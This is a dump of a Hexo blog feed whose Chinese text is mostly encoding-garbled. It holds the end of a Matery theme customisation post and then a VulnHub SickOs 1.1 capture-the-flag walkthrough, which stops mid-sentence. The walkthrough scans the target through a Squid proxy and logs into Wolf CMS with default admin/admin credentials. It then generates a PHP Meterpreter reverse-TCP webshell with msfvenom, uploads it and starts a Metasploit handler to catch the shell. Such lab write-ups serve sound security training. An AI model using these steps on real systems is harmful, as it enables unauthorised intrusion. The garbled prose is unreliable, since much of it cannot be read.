æ‘˜è¦å†…å®¹ï¼Œå¦‚æœè¿™ä¸ªå±æ€§æœ‰å€¼ï¼Œæ–‡ç« å¡ç‰‡æ‘˜è¦å°±æ˜¾ç¤ºè¿™æ®µæ–‡å­—ï¼Œå¦åˆ™ç¨‹åºä¼šè‡ªåŠ¨æˆªå–æ–‡ç« çš„éƒ¨åˆ†å†…å®¹ä½œä¸ºæ‘˜è¦categories: Markdowntags:  - Typora  - Markdown---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="æ•ˆæœæˆªå›¾"><a href="#æ•ˆæœæˆªå›¾" class="headerlink" title="æ•ˆæœæˆªå›¾"></a>æ•ˆæœæˆªå›¾</h2><p><a href="https://camo.githubusercontent.com/ca91ff24a662fc02f64cfed3446fadc7d84dade01a698ebe3dd7b3710926489a/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d312e706e67"><img src="https://camo.githubusercontent.com/ca91ff24a662fc02f64cfed3446fadc7d84dade01a698ebe3dd7b3710926489a/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d312e706e67" alt="é¦–é¡µ"></a></p><p><a href="https://camo.githubusercontent.com/cc39895742d9eb7a90d25b8f4935be41a4feffc034eb1e3f665316699634e5cc/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d322e706e67"><img src="https://camo.githubusercontent.com/cc39895742d9eb7a90d25b8f4935be41a4feffc034eb1e3f665316699634e5cc/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d322e706e67" alt="é¦–é¡µæ¨èæ–‡ç« "></a></p><p><a href="https://camo.githubusercontent.com/a19a106d92f07d240643dfb8a2712fd0b2271d3dd6e24300732f2d96aac98393/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d332e706e67"><img src="https://camo.githubusercontent.com/a19a106d92f07d240643dfb8a2712fd0b2271d3dd6e24300732f2d96aac98393/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d332e706e67" alt="é¦–é¡µæ–‡ç« åˆ—è¡¨"></a></p><p><a href="https://camo.githubusercontent.com/44cacfc83c73411a8932d19fbfb3a24f49d39676837f84691796d258dd468a83/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d372e706e67"><img src="https://camo.githubusercontent.com/44cacfc83c73411a8932d19fbfb3a24f49d39676837f84691796d258dd468a83/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d372e706e67" alt="é¦–é¡µæ–‡ç« åˆ—è¡¨"></a></p><p><a href="https://camo.githubusercontent.com/552609ffbcb915e5630e8506adda1d15fdfbcc10c2517e5e5729ac0ea22842bd/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d382e706e67"><img src="https://camo.githubusercontent.com/552609ffbcb915e5630e8506adda1d15fdfbcc10c2517e5e5729ac0ea22842bd/687474703a2f2f7374617469632e626c696e6b666f782e636f6d2f6d61746572792d32303138313230322d382e706e67" alt="é¦–é¡µæ–‡ç« åˆ—è¡¨"></a></p><h2 id="è‡ªå®šåˆ¶ä¿®æ”¹"><a href="#è‡ªå®šåˆ¶ä¿®æ”¹" class="headerlink" title="è‡ªå®šåˆ¶ä¿®æ”¹"></a>è‡ªå®šåˆ¶ä¿®æ”¹</h2><p>åœ¨æœ¬ä¸»é¢˜çš„ <code>_config.yml</code> ä¸­å¯ä»¥ä¿®æ”¹éƒ¨åˆ†è‡ªå®šä¹‰ä¿¡æ¯ï¼Œæœ‰ä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ï¼š</p><ul><li>èœå•</li><li>æˆ‘çš„æ¢¦æƒ³</li><li>é¦–é¡µçš„éŸ³ä¹æ’­æ”¾å™¨å’Œè§†é¢‘æ’­æ”¾å™¨é…ç½®</li><li>æ˜¯å¦æ˜¾ç¤ºæ¨èæ–‡ç« åç§°å’ŒæŒ‰é’®é…ç½®</li><li><code>favicon</code> å’Œ <code>Logo</code></li><li>ä¸ªäººä¿¡æ¯</li><li>TOC ç›®å½•</li><li>æ–‡ç« æ‰“èµä¿¡æ¯</li><li>å¤åˆ¶æ–‡ç« å†…å®¹æ—¶è¿½åŠ ç‰ˆæƒä¿¡æ¯</li><li>MathJax</li><li>æ–‡ç« å­—æ•°ç»Ÿè®¡ã€é˜…è¯»æ—¶é•¿</li><li>ç‚¹å‡»é¡µé¢çš„â€™çˆ±å¿ƒâ€™æ•ˆæœ</li><li>æˆ‘çš„é¡¹ç›®</li><li>æˆ‘çš„æŠ€èƒ½</li><li>æˆ‘çš„ç›¸å†Œ</li><li><code>Gitalk</code>ã€<code>Gitment</code>ã€<code>Valine</code> å’Œ <code>disqus</code> è¯„è®ºé…ç½®</li><li><a href="http://busuanzi.ibruce.info/">ä¸è’œå­ç»Ÿè®¡</a>å’Œè°·æ­Œåˆ†æï¼ˆ<code>Google Analytics</code>ï¼‰</li><li>é»˜è®¤ç‰¹è‰²å›¾çš„é›†åˆã€‚å½“æ–‡ç« æ²¡æœ‰è®¾ç½®ç‰¹è‰²å›¾æ—¶ï¼Œæœ¬ä¸»é¢˜ä¼šæ ¹æ®æ–‡ç« æ ‡é¢˜çš„ <code>hashcode</code> å€¼å–ä½™ï¼Œæ¥é€‰æ‹©å±•ç¤ºå¯¹åº”çš„ç‰¹è‰²å›¾</li></ul><p><strong>æˆ‘è®¤ä¸ºä¸ªäººåšå®¢åº”è¯¥éƒ½æœ‰è‡ªå·±çš„é£æ ¼å’Œç‰¹è‰²</strong>ã€‚å¦‚æœæœ¬ä¸»é¢˜ä¸­çš„è¯¸å¤šåŠŸèƒ½å’Œä¸»é¢˜è‰²å½©ä½ ä¸æ»¡æ„ï¼Œå¯ä»¥åœ¨ä¸»é¢˜ä¸­è‡ªå®šä¹‰ä¿®æ”¹ï¼Œå¾ˆå¤šæ›´è‡ªç”±çš„åŠŸèƒ½å’Œç»†èŠ‚ç‚¹çš„ä¿®æ”¹éš¾ä»¥åœ¨ä¸»é¢˜çš„ <code>_config.yml</code> ä¸­å®Œæˆï¼Œéœ€è¦ä¿®æ”¹æºä»£ç æ‰æ¥å®Œæˆã€‚ä»¥ä¸‹åˆ—å‡ºäº†å¯èƒ½å¯¹ä½ æœ‰ç”¨çš„åœ°æ–¹ï¼š</p><h3 id="ä¿®æ”¹ä¸»é¢˜é¢œè‰²"><a href="#ä¿®æ”¹ä¸»é¢˜é¢œè‰²" class="headerlink" title="ä¿®æ”¹ä¸»é¢˜é¢œè‰²"></a>ä¿®æ”¹ä¸»é¢˜é¢œè‰²</h3><p>åœ¨ä¸»é¢˜æ–‡ä»¶çš„ <code>/source/css/matery.css</code> æ–‡ä»¶ä¸­ï¼Œæœç´¢ <code>.bg-color</code> æ¥ä¿®æ”¹èƒŒæ™¯é¢œè‰²ï¼š</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;* æ•´ä½“èƒŒæ™¯é¢œè‰²ï¼ŒåŒ…æ‹¬å¯¼èˆªã€ç§»åŠ¨ç«¯çš„å¯¼èˆªã€é¡µå°¾ã€æ ‡ç­¾é¡µç­‰çš„èƒŒæ™¯é¢œè‰². *&#x2F;.bg-color &#123;    background-image: linear-gradient(to right, #4cbf30 0%, #0f9d58 100%);&#125;@-webkit-keyframes rainbow &#123;   &#x2F;* åŠ¨æ€åˆ‡æ¢èƒŒæ™¯é¢œè‰². *&#x2F;&#125;@keyframes rainbow &#123;    &#x2F;* åŠ¨æ€åˆ‡æ¢èƒŒæ™¯é¢œè‰². *&#x2F;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ä¿®æ”¹-banner-å›¾å’Œæ–‡ç« ç‰¹è‰²å›¾"><a href="#ä¿®æ”¹-banner-å›¾å’Œæ–‡ç« ç‰¹è‰²å›¾" class="headerlink" title="ä¿®æ”¹ banner å›¾å’Œæ–‡ç« ç‰¹è‰²å›¾"></a>ä¿®æ”¹ banner å›¾å’Œæ–‡ç« ç‰¹è‰²å›¾</h3><p>ä½ å¯ä»¥ç›´æ¥åœ¨ <code>/source/medias/banner</code> æ–‡ä»¶å¤¹ä¸­æ›´æ¢ä½ å–œæ¬¢çš„ <code>banner</code> å›¾ç‰‡ï¼Œä¸»é¢˜ä»£ç ä¸­æ˜¯æ¯å¤©åŠ¨æ€åˆ‡æ¢ä¸€å¼ ï¼Œåªéœ€ <code>7</code> å¼ å³å¯ã€‚å¦‚æœä½ ä¼š <code>JavaScript</code> ä»£ç ï¼Œå¯ä»¥ä¿®æ”¹æˆä½ è‡ªå·±å–œæ¬¢åˆ‡æ¢é€»è¾‘ï¼Œå¦‚ï¼šéšæœºåˆ‡æ¢ç­‰ï¼Œ<code>banner</code> åˆ‡æ¢çš„ä»£ç ä½ç½®åœ¨ <code>/layout/_partial/bg-cover-content.ejs</code> æ–‡ä»¶çš„ <code>&lt;script&gt;&lt;/script&gt;</code> ä»£ç ä¸­ï¼š</p><pre class="line-numbers language-none"><code class="language-none">$(&#39;.bg-cover&#39;).css(&#39;background-image&#39;, &#39;url(&#x2F;medias&#x2F;banner&#x2F;&#39; + new Date().getDay() + &#39;.jpg)&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨ <code>/source/medias/featureimages</code> æ–‡ä»¶å¤¹ä¸­é»˜è®¤æœ‰ 24 å¼ ç‰¹è‰²å›¾ç‰‡ï¼Œä½ å¯ä»¥å†å¢åŠ æˆ–è€…å‡å°‘ï¼Œå¹¶éœ€è¦åœ¨ <code>_config.yml</code> åšåŒæ­¥ä¿®æ”¹ã€‚</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ç«™ç‚¹æ­å»ºã€Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub-SickOs-1.1æ¸—é€å­¦ä¹ </title>
      <link href="/2022/01/19/vulnhub-sickos-1.1-shen-tou-xue-xi/"/>
      <url>/2022/01/19/vulnhub-sickos-1.1-shen-tou-xue-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>é¶æœºåœ°å€ï¼š<a href="https://download.vulnhub.com/sickos/sick0s1.1.7z">https://download.vulnhub.com/sickos/sick0s1.1.7z</a></p><p>é¶æœºéš¾åº¦ï¼šä¸­çº§ï¼ˆCTFï¼‰</p><p>é¶æœºå‘å¸ƒæ—¥æœŸï¼š2015å¹´12æœˆ11æ—¥</p><p>é¶æœºæè¿°ï¼šè¿™ä¸ªCTFæ˜ç¡®åœ°æ¯”å–»äº†å¦‚ä½•åœ¨ç½‘ç»œä¸Šæ‰§è¡Œé»‘å®¢ç­–ç•¥ï¼Œä»¥åœ¨å®‰å…¨çš„ç¯å¢ƒä¸­å±å®³ç½‘ç»œã€‚ è¿™ä¸ªè™šæ‹Ÿæœºä¸æˆ‘åœ¨OSCPä¸­é‡åˆ°çš„å®éªŒå®¤éå¸¸ç›¸ä¼¼ã€‚ ç›®çš„æ˜¯ç ´åç½‘ç»œ/è®¡ç®—æœºå¹¶åœ¨å…¶ä¸Šè·å¾—ç®¡ç†/æ ¹ç›®å½•ç‰¹æƒã€‚</p><p>ç›®æ ‡ï¼šå¾—åˆ°rootæƒé™&amp;æ‰¾åˆ°flag.txt</p><p>ä½œè€…ï¼šF10Sec</p><p>æ—¶é—´ï¼š2021-07-05</p><p>è¯·æ³¨æ„ï¼š</p><p>å¯¹äºæ‰€æœ‰è¿™äº›è®¡ç®—æœºï¼Œæˆ‘å·²ç»ä½¿ç”¨VMwareè¿è¡Œä¸‹è½½çš„è®¡ç®—æœºã€‚æˆ‘å°†ä½¿ç”¨Kali Linuxä½œä¸ºè§£å†³è¯¥ç›®æ ‡çš„æ”»å‡»è€…æœºå™¨ã€‚è¿™é‡Œä½¿ç”¨çš„æŠ€æœ¯ä»…ç”¨äºå­¦ä¹ æ•™è‚²ç›®çš„ï¼Œå¦‚æœåˆ—å‡ºçš„æŠ€æœ¯ç”¨äºå…¶ä»–ä»»ä½•ç›®æ ‡ï¼Œæˆ‘æ¦‚ä¸è´Ÿè´£ã€‚</p><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>æˆ‘ä»¬åœ¨VMä¸­éœ€è¦ç¡®å®šæ”»å‡»ç›®æ ‡çš„IPåœ°å€ï¼Œå¯ä»¥ä½¿ç”¨netdiscover/nmapæ¥è·å–ç›®æ ‡ä¸»æœºçš„IPåœ°å€ï¼š</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">nmap <span class="token operator">-</span>sP <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> <span class="token operator">-</span>T4å‚æ•°è§£è¯»ï¼š<span class="token operator">-</span>sP <span class="token punctuation">:</span> ç”¨pingæ‰«æåˆ¤æ–­ä¸»æœºæ˜¯å¦å­˜æ´»ï¼Œåªæœ‰ä¸»æœºå­˜æ´»ï¼Œnmapæ‰ä¼šç»§ç»­æ‰«æï¼Œä¸€èˆ¬æœ€å¥½ä¸åŠ ï¼Œå› ä¸ºæœ‰çš„ä¸»æœºä¼šç¦æ­¢ping<span class="token operator">-</span>T4ï¼š æŒ‡å®šæ‰«æè¿‡ç¨‹ä½¿ç”¨çš„æ—¶åºï¼Œæ€»æœ‰<span class="token number">6</span>ä¸ªçº§åˆ«ï¼ˆ<span class="token number">0</span><span class="token operator">-</span><span class="token number">5</span>ï¼‰ï¼Œçº§åˆ«è¶Šé«˜ï¼Œæ‰«æé€Ÿåº¦è¶Šå¿«ï¼Œä½†ä¹Ÿå®¹æ˜“è¢«é˜²ç«å¢™æˆ–IDSæ£€æµ‹å¹¶å±è”½æ‰ï¼Œåœ¨ç½‘ç»œé€šè®¯çŠ¶å†µè¾ƒå¥½çš„æƒ…å†µä¸‹æ¨èä½¿ç”¨T4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616298.png" alt="img"></p><p>æˆ‘ä»¬å·²ç»æ‰¾åˆ°äº†ç›®æ ‡è®¡ç®—æœºIPåœ°å€ï¼š192.168.1.11</p><p>ç¬¬ä¸€æ­¥æ˜¯æ‰¾å‡ºç›®æ ‡è®¡ç®—æœºä¸Šå¯ç”¨çš„å¼€æ”¾ç«¯å£å’Œä¸€äº›æœåŠ¡ã€‚å› æ­¤æˆ‘åœ¨ç›®æ ‡è®¡ç®—æœºä¸Šå¯åŠ¨äº†nmapå…¨ç«¯å£T5é€Ÿåº¦æ‰«æï¼š</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">nmap <span class="token operator">-</span>sS <span class="token operator">-</span>sV <span class="token operator">-</span>sC <span class="token operator">-</span>O <span class="token operator">-</span>T5  <span class="token operator">-</span>Pn <span class="token operator">-</span>p<span class="token operator">-</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.11</span>å‚æ•°è§£è¯»ï¼š<span class="token operator">-</span>A ï¼šå¯ç”¨<span class="token operator">-</span>Aé€‰é¡¹ä¹‹åï¼ŒNmapå°†æ£€æµ‹ç›®æ ‡ä¸»æœºçš„ä¸‹è¿°ä¿¡æ¯        æœåŠ¡ç‰ˆæœ¬è¯†åˆ«ï¼ˆ<span class="token operator">-</span>sVï¼‰ï¼›        æ“ä½œç³»ç»Ÿè¯†åˆ«ï¼ˆ<span class="token operator">-</span>Oï¼‰ï¼›        è„šæœ¬æ‰«æï¼ˆ<span class="token operator">-</span>sCï¼‰ï¼›        Tracerouteï¼ˆâ€“tracerouteï¼‰<span class="token operator">-</span>sS<span class="token operator">/</span>sT<span class="token operator">/</span>sA<span class="token operator">/</span>sW<span class="token operator">/</span>sM<span class="token punctuation">:</span>æŒ‡å®šä½¿ç”¨ TCP SYN<span class="token operator">/</span><span class="token function">Connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">/</span>ACK<span class="token operator">/</span>Window<span class="token operator">/</span>Maimon scansçš„æ–¹å¼æ¥å¯¹ç›®æ ‡ä¸»æœºè¿›è¡Œæ‰«æ<span class="token operator">-</span>sV<span class="token punctuation">:</span> æŒ‡å®šè®©Nmapè¿›è¡ŒæœåŠ¡ç‰ˆæœ¬æ‰«æ<span class="token operator">-</span>p<span class="token operator">-</span>ï¼šè¿›è¡Œå…¨ç«¯å£æ‰«æ<span class="token operator">-</span>Pnï¼šç¦ç”¨ä¸»æœºæ£€æµ‹ï¼ˆ<span class="token operator">-</span>Pnï¼‰<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616592.png" alt="img"></p><table><thead><tr><th>PORT</th><th>SERVICE</th><th>VERSION DETECTION</th></tr></thead><tbody><tr><td>TCP: 22</td><td>SSH</td><td>OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)</td></tr><tr><td>TCP: 3128</td><td>HTTP-Proxy</td><td>Squid http proxy 3.1.19</td></tr><tr><td>TCP: 8080</td><td>HTTP-Proxy</td><td>http proxy 3.1.19</td></tr></tbody></table><p>ç›®æ ‡è®¡ç®—æœºä¸Šå¼€æ”¾äº†22ã€3128ã€8080ä¸‰ä¸ªç«¯å£ã€‚</p><h2 id="Squid-æšä¸¾"><a href="#Squid-æšä¸¾" class="headerlink" title="Squid æšä¸¾"></a>Squid æšä¸¾</h2><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616669.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616803.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616470.png" alt="img"></p><h2 id="Nikto-é€šè¿‡ä»£ç†æ‰«æ"><a href="#Nikto-é€šè¿‡ä»£ç†æ‰«æ" class="headerlink" title="Nikto é€šè¿‡ä»£ç†æ‰«æ"></a>Nikto é€šè¿‡ä»£ç†æ‰«æ</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">nikto ï¼šå¼€æºçš„WEBæ‰«æè¯„ä¼°è½¯ä»¶ï¼Œå¯ä»¥æ‰«ææŒ‡å®šä¸»æœºçš„WEBç±»å‹ã€ä¸»æœºåã€æŒ‡å®šç›®å½•ã€ç‰¹å®šCGIæ¼æ´ã€è¿”å›ä¸»æœºå…è®¸çš„ httpæ¨¡å¼ç­‰nikto <span class="token operator">-</span>h 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11 <span class="token operator">-</span>useproxy http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11:3128<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616990.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617155.png" alt="img"></p><table><thead><tr><th><a href="https://www.wappalyzer.com/technologies/web-servers/?utm_source=popup&utm_medium=extension&utm_campaign=wappalyzer">Web æœåŠ¡å™¨</a></th><th>ç¼–ç¨‹è¯­è¨€</th><th><a href="https://www.wappalyzer.com/technologies/operating-systems/?utm_source=popup&utm_medium=extension&utm_campaign=wappalyzer">æ“ä½œç³»ç»Ÿ</a></th></tr></thead><tbody><tr><td>Apache: 2.2.22</td><td>PHP 5.3.10</td><td>Ubuntu</td></tr></tbody></table><p>Nikto æ‰«æå‘ç°å­˜åœ¨<code>robots.txt</code>ç›®å½•ã€<code>cgi-bin/status</code>ï¼ˆå®¹æ˜“å—åˆ°shellshockæ”»å‡»ï¼‰ï¼Œå­˜åœ¨å¯åˆ©ç”¨æ¼æ´ï¼›</p><h2 id="æ¼æ´æµ‹è¯•"><a href="#æ¼æ´æµ‹è¯•" class="headerlink" title="æ¼æ´æµ‹è¯•"></a>æ¼æ´æµ‹è¯•</h2><p>è¿™è¾¹å…ˆç”¨å¼€å¯ä»£ç†ï¼Œç„¶åè®¿é—®ç›®æ ‡ä¸»æœºçš„80ç«¯å£ï¼›</p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617771.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617709.png" alt="img"></p><p>æŸ¥çœ‹æºä»£ç æ²¡å•¥æ¸¸æ³³çš„ä¿¡æ¯ï¼Œè¿™è¾¹æ˜¯ç”¨ä»£ç†æ¥è®¿é—®çš„80ï¼Œæ‰“å¼€robots.txtå‘ç°å­˜åœ¨wolfcmsç›®å½•ï¼›</p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617365.png" alt="img"></p><p>æ‰¾åˆ°/wolfcmsçš„ä¿¡æ¯ï¼Œæœ‰å¯èƒ½æ­¤ç½‘ç«™æ˜¯ä½¿ç”¨Wolf CMSä¸­æ­å»ºçš„ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸ªç›®å½•â€¦â€¦..</p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617306.png" alt="img"></p><p>ä½¿ç”¨æœç´¢å¼•æ“æœç´¢Wolf CMSï¼Œå‘ç°æ˜¯ä¸ªå¼€æºçš„CMSï¼Œåœ¨github[<a href="https://github.com/wolfcms/wolfcms]%E4%B8%8A%E5%8F%AF%E4%BB%A5%E6%9F%A5%E7%9C%8B%E5%88%B0%E6%BA%90%E7%A0%81%E4%BF%A1%E6%81%AF%EF%BC%9B">https://github.com/wolfcms/wolfcms]ä¸Šå¯ä»¥æŸ¥çœ‹åˆ°æºç ä¿¡æ¯ï¼›</a></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617175.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617808.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617256.png" alt="img"></p><h2 id="ç›®å½•æšä¸¾"><a href="#ç›®å½•æšä¸¾" class="headerlink" title="ç›®å½•æšä¸¾"></a>ç›®å½•æšä¸¾</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">gobuster <span class="token function">dir</span> <span class="token operator">-</span>u http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11/wolfcms/  <span class="token operator">-</span>w <span class="token operator">/</span>usr/share/wordlists/dirbuster/directory-list-2<span class="token punctuation">.</span>3-medium<span class="token punctuation">.</span>txt <span class="token operator">-</span>t 50 <span class="token operator">--</span>random-agent   <span class="token operator">--</span>proxy   http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11:3128<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618447.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618617.png" alt="img"></p><p>è®¿é—®ä¸‹/?/admin/loginï¼Œè¿™æ˜¯é€šç—…â€¦é‡åˆ°Wolf cmsç›´æ¥èƒ½ä½¿ç”¨è¿™ä¸ªç›®å½•è¿›å…¥ç™»å½•ç•Œé¢</p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618975.png" alt="img"></p><p>ä½¿ç”¨è´¦æˆ·å¯†ç admin/adminæˆåŠŸç™»å½•åˆ°ç½‘ç«™åå°(ä¸è¦é—®æˆ‘æ€ä¹ˆçŸ¥é“çš„â€¦â€¦.)</p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618419.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618261.png" alt="img"></p><h2 id="ä¸Šä¼ Webshell"><a href="#ä¸Šä¼ Webshell" class="headerlink" title="ä¸Šä¼ Webshell"></a>ä¸Šä¼ Webshell</h2><h3 id="1ã€ä¸Šä¼ php-meterpreter-payloadæ–‡ä»¶ï¼Œæµè§ˆå™¨è®¿é—®ä¸Šä¼ åçš„æ–‡ä»¶ï¼Œè·å–phpç±»å‹çš„åå¼¹ä¼šè¯ï¼›"><a href="#1ã€ä¸Šä¼ php-meterpreter-payloadæ–‡ä»¶ï¼Œæµè§ˆå™¨è®¿é—®ä¸Šä¼ åçš„æ–‡ä»¶ï¼Œè·å–phpç±»å‹çš„åå¼¹ä¼šè¯ï¼›" class="headerlink" title="1ã€ä¸Šä¼ php meterpreter payloadæ–‡ä»¶ï¼Œæµè§ˆå™¨è®¿é—®ä¸Šä¼ åçš„æ–‡ä»¶ï¼Œè·å–phpç±»å‹çš„åå¼¹ä¼šè¯ï¼›"></a>1ã€ä¸Šä¼ php meterpreter payloadæ–‡ä»¶ï¼Œæµè§ˆå™¨è®¿é—®ä¸Šä¼ åçš„æ–‡ä»¶ï¼Œè·å–phpç±»å‹çš„åå¼¹ä¼šè¯ï¼›</h3><p>æˆåŠŸç™»å½•åï¼Œå‘ç°èƒ½ä¸Šä¼ æ–‡ä»¶ï¼Œè¿™è¾¹è¦ä½¿ç”¨msfvenomåšPHPæœ¨é©¬æ–‡ä»¶ä¸Šä¼ è¿›è¡Œshellææƒ</p><h4 id="1ã€ç­›é€‰payload"><a href="#1ã€ç­›é€‰payload" class="headerlink" title="1ã€ç­›é€‰payload"></a>1ã€ç­›é€‰payload</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">msfvenom <span class="token operator">-</span>l payload <span class="token punctuation">|</span> grep php <span class="token punctuation">|</span> grep meterpreter    ç­›é€‰åˆé€‚çš„payload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618025.png" alt="img"></p><h4 id="2ã€ç”Ÿæˆpayload"><a href="#2ã€ç”Ÿæˆpayload" class="headerlink" title="2ã€ç”Ÿæˆpayload"></a>2ã€ç”Ÿæˆpayload</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">msfvenom <span class="token operator">-</span>p php/meterpreter_reverse_tcp lhost=192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>7 lport=6666 <span class="token operator">-</span>o Wolfcms<span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619417.png" alt="img"></p><h4 id="3ã€ä¸Šä¼ payload"><a href="#3ã€ä¸Šä¼ payload" class="headerlink" title="3ã€ä¸Šä¼ payload"></a>3ã€ä¸Šä¼ payload</h4><p>åœ¨webé¡µé¢ä¸Šä¼ åè®°å½•ä¸‹ä¸Šä¼ æ–‡ä»¶çš„è·¯å¾„ï¼›</p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619999.png" alt="img"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">ä¸Šä¼ åæ–‡ä»¶çš„ç›®å½•ï¼šhttp:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11/wolfcms/public/Wolfcms<span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4ã€Kaliè®¾ç½®ç›‘å¬è½½è·"><a href="#4ã€Kaliè®¾ç½®ç›‘å¬è½½è·" class="headerlink" title="4ã€Kaliè®¾ç½®ç›‘å¬è½½è·"></a>4ã€Kaliè®¾ç½®ç›‘å¬è½½è·</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">use exploit/multi/handler<span class="token function">set</span> payload php/meterpreter_reverse_tcpshow options<span class="token function">set</span> LHOST 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>7<span class="token function">set</span> LPORT 6666exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619404.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619212.png" alt="img"></p><p>æ³¨æ„ï¼šæ­¤æ—¶ä¸Šä¼ çš„phpç±»å‹çš„Meterpreteræ˜¯ä¸å…·å¤‡å®Œæ•´åŠŸèƒ½çš„ï¼Œå› æ­¤å¯ä»¥ç»§ç»­ä¸Šä¼ å¯¹åº”æ“ä½œç³»ç»Ÿç±»å‹çš„payloadè·å–æ›´å¤šçš„æ“ä½œåŠŸèƒ½ï¼›è¿™é‡Œå‘ç°éšç„¶è·å–äº†Metrepreterä¼šè¯ï¼Œä½†æ˜¯shellå‘½ä»¤æ— 